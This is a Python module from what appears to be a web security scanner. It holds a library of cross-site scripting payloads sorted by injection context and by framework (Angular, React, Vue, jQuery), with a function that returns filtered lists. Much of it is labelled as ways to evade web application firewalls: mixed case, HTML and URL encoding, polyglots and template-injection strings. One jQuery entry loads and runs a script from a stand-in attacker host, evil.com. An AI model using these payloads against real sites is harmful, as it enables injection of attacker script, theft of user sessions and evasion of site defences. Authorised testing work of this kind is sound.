"""Extended XSS payloads with WAF-evading variants."""

# Extended XSS payloads organized by context
XSS_PAYLOADS = [
    # Basic script
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    "javascript:alert(1)",
    
    # Event handlers
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '<body onload=alert(1)>',
    '<input autofocus onfocus=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<select autofocus onfocus=alert(1)>',
    
    # WAF bypass - mixed case
    '<ScRiPt>alert(1)</sCrIpT>',
    '<IMG SRC=x onerror=alert(1)>',
    
    # WAF bypass - encoded
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    
    # WAF bypass - polyglots
    '"><svg/onload=alert(1)>',
    "'-alert(1)-'",
    '";alert(1)//',
    
    # WAF bypass - unicode variants
    '<script\\x20>alert(1)</script>',
    '<scrscriptipt>alert(1)</scrscriptipt>',
    
    # DOM-based
    '<a href="javascript:alert(1)">click</a>',
    '<iframe src="javascript:alert(1)">',
    
    # Angular
    '{{constructor.constructor("alert(1)")()}}',
    '${constructor.constructor("alert(1)")()}',
    
    # React
    '{"props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}}',
]

# Payloads grouped by framework
FRAMEWORK_XSS_PAYLOADS = {
    "angular": [
        '{{constructor.constructor("alert(1)")()}}',
        '{{$on.constructor("alert(1)")()}}',
        '{{a="constructor";b="constructor";a[b]("alert(1)")()}}',
    ],
    "react": [
        '{"props":{"dangerouslySetInnerHTML":{"__html":"<img src=x onerror=alert(1)>"}}}',
        '<img src=x onerror=alert(1)>',
    ],
    "vue": [
        '{{constructor.constructor("alert(1)")()}}',
        '{{{_safe}}}\\'',
    ],
    "jquery": [
        '<img src=x onerror=alert(1)>',
        '<script>$.getScript("https://evil.com/xss.js")</script>',
    ],
}

# Payloads by context
CONTEXT_XSS_PAYLOADS = {
    "html": ['<script>alert(1)</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(1)>'],
    "attribute": ['" onfocus=alert(1) autofocus="', '" onmouseover=alert(1) "'],
    "javascript": ["';alert(1);//", '";alert(1);//'],
    "url": ['javascript:alert(1)', 'javascript:alert(1);//'],
}


def get_xss_payloads(framework: str | None = None, context: str | None = None) -> list[str]:
    """Get XSS payloads, optionally filtered by framework and context."""
    payloads = list(XSS_PAYLOADS)
    if framework and framework.lower() in FRAMEWORK_XSS_PAYLOADS:
        payloads.extend(FRAMEWORK_XSS_PAYLOADS[framework.lower()])
    if context and context.lower() in CONTEXT_XSS_PAYLOADS:
        payloads.extend(CONTEXT_XSS_PAYLOADS[context.lower()])
    return payloads
